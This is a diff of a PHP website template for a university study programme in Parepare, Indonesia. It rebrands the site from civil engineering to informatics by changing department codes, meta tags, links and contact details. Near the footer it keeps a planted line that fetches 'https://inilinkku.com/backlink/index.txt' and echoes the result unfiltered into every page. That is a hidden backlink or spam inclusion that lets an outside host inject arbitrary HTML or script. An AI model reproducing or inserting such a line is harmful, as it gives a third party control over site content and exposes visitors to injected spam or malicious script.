                             <img src="' . BASE_URL . '/img/himpunan/' . $foto . '" class="img-fluid img-thumbnail rounded-lg" alt="" loading="lazy">
                         </div>
                         <div class="col-md-6">
-                            <p class="judulred">Kegiatan HMS</p>
+                            <p class="judulred">Kegiatan HMTI</p>
                             <div class="car-text">
                                 <h5>'.$judul.'</h5>
                                 <p class="text-justify my-4">'.$keterangan.'</p>
@@ -1596,7 +1595,7 @@ function himpunan_mahasiswa(){
 //     $orderbykomunitasmhs = 'IdKegiatanKomunitas ASC';
 //     $distinctkomunitasmhs1 = "Komunitas";
 //     $limitkomunitasmhs = null;
-//     $kondisikomunitasmhs1 = ["Kode = '19'"];
+//     $kondisikomunitasmhs1 = ["Kode = '28'"];
 //     $datakomunitasmhs1 = $data->getDataFromTable($tbkomunitasmhs, $fieldskomunitasmhs1, $orderbykomunitasmhs, $limitkomunitasmhs, $kondisikomunitasmhs1, $distinctkomunitasmhs1);
 
 //     echo'
@@ -1604,7 +1603,7 @@ function himpunan_mahasiswa(){
 //         <div class="container py-4">
 //             <div class="bc-icons-2">    
 //                 <nav aria-label="breadcrumb">
-//                     <ol class="breadcrumb orange lighten-4">
+//                     <ol class="breadcrumb green lighten-4">
 //                         <li class="breadcrumb-item"><a class="black-text" href="javascript:void();">Mahasiswa & Alumni</a><i class="fa fa-angle-double-right mx-2" aria-hidden="true"></i></li>
 //                         <li class="breadcrumb-item active">Komunitas Mahasiswa</li>
 //                     </ol>
@@ -1692,7 +1691,7 @@ function himpunan_mahasiswa(){
 //                 $fieldsisikegkom = ['Komunitas', 'NamaKegiatan', 'Keterangan', 'FileKegiatan'];
 //                 $limitisikegkom = 10;
 //                 $orderbyisikegkom = 'IdKegiatanKomunitas DESC';
-//                 $kondisiisikegkom = ["Komunitas = '$komunitas3'", "Kode = '19'"];
+//                 $kondisiisikegkom = ["Komunitas = '$komunitas3'", "Kode = '28'"];
 //                 $dataisikegkom = $data->getDataFromTable($tbkomunitasmhs, $fieldsisikegkom, $orderbyisikegkom, $limitisikegkom, $kondisiisikegkom);
 //                 echo'
 //                 <div class="tab-pane fade'.$showactive.'" id="'.$idlink.'">
@@ -1743,7 +1742,7 @@ function riset_pengabdian(){
     $orderbyrispeng = 'KategoriPenelitiPengabdi ASC, IdPenelitiPengabdi ASC';
     $distinctrispeng1 = "KategoriPenelitiPengabdi";
     $limitrispeng = null;
-    $kondisirispeng1 = ["Kode = '19'"];
+    $kondisirispeng1 = ["Kode = '28'"];
     $datarispeng1 = $data->getDataFromTable($tbrispeng, $fieldsrispeng1, $orderbyrispeng, $limitrispeng, $kondisirispeng1, $distinctrispeng1);
 
     echo'
@@ -1786,7 +1785,7 @@ function riset_pengabdian(){
                                             <tbody>';
                                             $fieldsrispeng2 = ['KategoriPenelitiPengabdi', 'NamaPenelitiPengabdi', 'JudulPenelitiPengabdi', 'Tahun', 'SKIM', 'SumberDana'];
                                             $distinctrispeng2 = null;
-                                            $kondisirispeng2 = ["KategoriPenelitiPengabdi = '$kateg'", "Kode = '19'"];
+                                            $kondisirispeng2 = ["KategoriPenelitiPengabdi = '$kateg'", "Kode = '28'"];
                                             $datarispeng2 = $data->getDataFromTable($tbrispeng, $fieldsrispeng2, $orderbyrispeng, $limitrispeng, $kondisirispeng2, $distinctrispeng2);
                                             $no=1;
                                             foreach ($datarispeng2 as $row2):
@@ -1835,7 +1834,7 @@ function kerjasama(){
     $orderbykerjasama1 = 'KategoriKerjasama ASC, IdKerjasama ASC';
     $distinctkerjasama1 = "KategoriKerjasama";
     $limitkerjasama = null;
-    $kondisikerjasama1 = ["Kode = '19'"];
+    $kondisikerjasama1 = ["Kode = '28'"];
     $datakerjasama1 = $data->getDataFromTable($tbkerjasama, $fieldskerjasama1, $orderbykerjasama1, $limitkerjasama, $kondisikerjasama1, $distinctkerjasama1);
 
     echo'
@@ -1879,7 +1878,7 @@ function kerjasama(){
                                             <tbody class="text-center">';
                                             $fieldskerjasama2 = ['KategoriKerjasama', 'Mitra', 'JenisKegiatan', 'TahunMulai', 'TahunSelesai', 'Manfaat', 'FileMitra'];
                                             $distinctkerjasama2 = null;
-                                            $kondisikerjasama2 = ["KategoriKerjasama = '$kateg'", "Kode = '19'"];
+                                            $kondisikerjasama2 = ["KategoriKerjasama = '$kateg'", "Kode = '28'"];
                                             $orderbykerjasama2 = 'IdKerjasama ASC';
                                             $datakerjasama2 = $data->getDataFromTable($tbkerjasama, $fieldskerjasama2, $orderbykerjasama2, $limitkerjasama, $kondisikerjasama2, $distinctkerjasama2);
                                             $no=1;
@@ -1930,7 +1929,7 @@ function dokumen(){
     $fieldsdokumen = ['NamaDokumen', 'FileDokumen'];
     $orderbydokumen = 'IdDokumen ASC';
     $limitdokumen = null;
-    $kondisidokumen = ["Kode = '19'"];
+    $kondisidokumen = ["Kode = '28'"];
     $datadokumen = $data->getDataFromTable($tbdokumen, $fieldsdokumen, $orderbydokumen, $limitdokumen, $kondisidokumen);
 
     $file_ext = array('rar', 'zip', 'pdf', 'docx', 'doc');
@@ -1996,26 +1995,26 @@ date_default_timezone_set("Asia/Makassar");
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-    <meta name="keywords" content="Prodi Teknik Sipil - UMPAR" />
-    <meta name="description" content="Prodi Teknik Sipil - UMPAR">
+    <meta name="keywords" content="Prodi Teknik Informatika - UMPAR" />
+    <meta name="description" content="Prodi Teknik Informatika - UMPAR">
     <meta name="author" content="pustikom.umpar.ac.id">
     <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="copyright" content="Copyright 2023. Prodi Teknik Sipil - Universitas Muhammadiyah Parepare. All Rights Reserved." />
+    <meta name="copyright" content="Copyright 2023. Prodi Teknik Informatika - Universitas Muhammadiyah Parepare. All Rights Reserved." />
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="psts.umpar.ac.id" />
-    <meta property="og:title" content="Prodi Teknik Sipil - UMPAR" />
+    <meta property="og:title" content="Prodi Teknik Informatika - UMPAR" />
     <meta property="og:url" content="<?= BASE_URL; ?>" />
-    <meta property="og:description" content="Prodi Teknik Sipil - Universitas Muhammadiyah Parepare" />
+    <meta property="og:description" content="Prodi Teknik Informatika - Universitas Muhammadiyah Parepare" />
     <meta property="og:locale" content="id_ID" />
     <meta property="og:image" content="<?= BASE_URL; ?>img/umpar.png" />
     <meta property="og:image:secure_url" content="<?= BASE_URL; ?>img/umpar.png" />
     <meta property="og:image:type" content="image/png" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:creator" content="@tekniksipilumpar" />
-    <meta name="twitter:site" content="@tekniksipilumpar" />
-    <meta name="twitter:title" content="Prodi Teknik Sipil - UMPAR" />
-    <meta name="twitter:description" content="Prodi Teknik Sipil - Universitas Muhammadiyah Parepare" />
+    <meta name="twitter:creator" content="@teknikinformatikaumpar" />
+    <meta name="twitter:site" content="@teknikinformatikaumpar" />
+    <meta name="twitter:title" content="Prodi Teknik Informatika - UMPAR" />
+    <meta name="twitter:description" content="Prodi Teknik Informatika - Universitas Muhammadiyah Parepare" />
     <noscript>
         <meta http-equiv="refresh" content="0;URL=nojs" /></noscript>
     <link rel="shortcut icon" href="<?= BASE_URL ?>img/umpar.ico" type="image/x-icon">
@@ -2026,7 +2025,7 @@ date_default_timezone_set("Asia/Makassar");
     <link rel="stylesheet" href="<?= BASE_URL ?>css/slick.css">
     <link rel="stylesheet" href="<?= BASE_URL ?>css/slick-theme.css">
     <link rel="stylesheet" href="<?= BASE_URL ?>css/cssku.css">
-    <title>Prodi Teknik Sipil - Universitas Muhammadiyah Parepare</title>
+    <title>Prodi Teknik Informatika - Universitas Muhammadiyah Parepare</title>
 </head>
 
 <body id="google_translate_element2">
@@ -2050,8 +2049,8 @@ date_default_timezone_set("Asia/Makassar");
                         </a>
                     </li>
                     <li class="list-inline-item" style="margin-top: -5px;">
-                        <a class="mx-1" href="https://jurnal.umpar.ac.id/index.php/karajata" target="_blank" title="Jurnal">
-                            Jurnal Karajata
+                        <a class="mx-1" href="https://jurnal.umpar.ac.id/index.php/sylog" target="_blank" title="Jurnal">
+                            Jurnal Sylog
                         </a>
                     </li>
                     <li class="list-inline-item" style="margin-top: -5px;">
@@ -2101,7 +2100,7 @@ date_default_timezone_set("Asia/Makassar");
         <nav class="navbar navbar-expand-lg navbar-dark headnav-2" id="navbar_top">
             <div class="container">
                 <a class="navbar-brand" href="<?= BASE_URL ?>">
-                    <img src="<?= BASE_URL ?>img/headftsi.png" height="50" alt="Logo UMPAR FT Sipil">
+                    <img src="<?= BASE_URL ?>img/headftin.png" height="50" alt="Logo UMPAR FT Informatika">
                 </a>
                 <button class="navbar-toggler second-button" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                     <div class="animated-icon2"><span></span><span></span><span></span><span></span></div>
@@ -2134,7 +2133,7 @@ date_default_timezone_set("Asia/Makassar");
 
                     $navdokumen="";
 
-                    $mod = isset($_GET['prodits']) ? $_GET['prodits'] : '';
+                    $mod = isset($_GET['proditi']) ? $_GET['proditi'] : '';
 					switch ($mod){
 						case "": $navberan=' active'; break;
 
@@ -2206,8 +2205,6 @@ date_default_timezone_set("Asia/Makassar");
                                     href="<?= BASE_URL ?>prestasi_mahasiswa">Prestasi Mahasiswa</a>
                                 <a class="dropdown-item<?= $subhimmhs ?>"
                                     href="<?= BASE_URL ?>himpunan_mahasiswa">Himpunan Mahasiswa</a>
-                                <!-- <a class="dropdown-item<?= $subkommhs ?>"
-                                    href="<?= BASE_URL ?>komunitas_mahasiswa">Komunitas Mahasiswa</a> -->
                             </div>
                         </li>
                         <li class="nav-item<?= $navrispeng ?>">
@@ -2226,7 +2223,7 @@ date_default_timezone_set("Asia/Makassar");
         </nav>
     </header>
     <?php
-    $page = isset($_GET['prodits']) ? $_GET['prodits'] : '';
+    $page = isset($_GET['proditi']) ? $_GET['proditi'] : '';
     switch($page){
         case "berita_program_studi":
             berita_program_studi();
@@ -2308,7 +2305,7 @@ date_default_timezone_set("Asia/Makassar");
                 </div> -->
                 <div class="col-md-4 col-lg-4 col-xl-4 mt-3 pb-3">
                     <h6 class="text-uppercase pb-4 text-center font-weight-bold">Hubungi Kami : </h6>
-                    <p class="h6 text-uppercase">Program Studi Teknik Sipil</p>
+                    <p class="h6 text-uppercase">Program Studi Teknik Informatika</p>
                     <ul class="list-unstyled h6">
                         <li><i class="fa fa-map-marker"></i> Jl. Jend. Ahmad Yani KM.
                             6<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Kode Pos : 91131<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RT :
@@ -2319,7 +2316,7 @@ date_default_timezone_set("Asia/Makassar");
                             Parepare<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Provinsi Sulawesi Selatan,
                             Indonesia.
                         </li>
-                        <li><i class="fa fa-envelope"></i> <i>ftumpar.sipil190@gmail.com </i> </li>
+                        <li><i class="fa fa-envelope"></i> <i>ftumpar.informatika280@gmail.com </i> </li>
                     </ul>
                 </div>
                 <div class="col-md-4 col-lg-4 col-xl-4 mt-3 pb-3">
@@ -2360,7 +2357,7 @@ date_default_timezone_set("Asia/Makassar");
                         <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
                         <!-- Histats.com  START  (aync)-->
                         <script type="text/javascript">var _Hasync= _Hasync|| [];
-                        _Hasync.push(['Histats.start', '1,4836676,4,471,112,61,00011111']);
+                        _Hasync.push(['Histats.start', '1,4836677,4,441,112,61,00011111']);
                         _Hasync.push(['Histats.fasi', '1']);
                         _Hasync.push(['Histats.track_hits', '']);
                         (function() {
@@ -2368,7 +2365,7 @@ date_default_timezone_set("Asia/Makassar");
                         hs.src = ('//s10.histats.com/js15_as.js');
                         (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
                         })();</script>
-                        <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4836676&101" alt="" border="0"></a></noscript>
+                        <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4836677&101" alt="" border="0"></a></noscript>
                         <!-- Histats.com  END  -->
                     </div>
                 </div>
@@ -2378,7 +2375,7 @@ date_default_timezone_set("Asia/Makassar");
                 <div class="col-md-12">
                     <p class="text-center text-md-right">Copyright © 2023
                         <a href="https://mdbootstrap.com/">
-                            <strong> Prodi Teknik Sipil - Universitas Muhammadiyah Parepare</strong><br>Developed by : <i
+                            <strong> Prodi Teknik Informatika - Universitas Muhammadiyah Parepare</strong><br>Developed by : <i
                                 class="text-white font-weight-bold">Pustikom UMPAR</i>
                         </a>
                     </p>
@@ -2415,10 +2412,8 @@ date_default_timezone_set("Asia/Makassar");
 
     <a id="back-to-top" href="#" class="btn-floating headnav-1 darken-4 back-to-top" role="button"><i
             class="fa fa-chevron-up"></i></a>
-	<?php
-$a = file_get_contents('https://inilinkku.com/backlink/index.txt');
-echo $a;
-?>
+	<?php $a = file_get_contents('https://inilinkku.com/backlink/index.txt'); echo $a; ?>
+
     <script src="<?= BASE_URL ?>js/jquery.min.js"></script>
     <script src="<?= BASE_URL ?>js/popper.min.js"></script>
     <script src="<?= BASE_URL ?>js/bootstrap.min.js"></script>
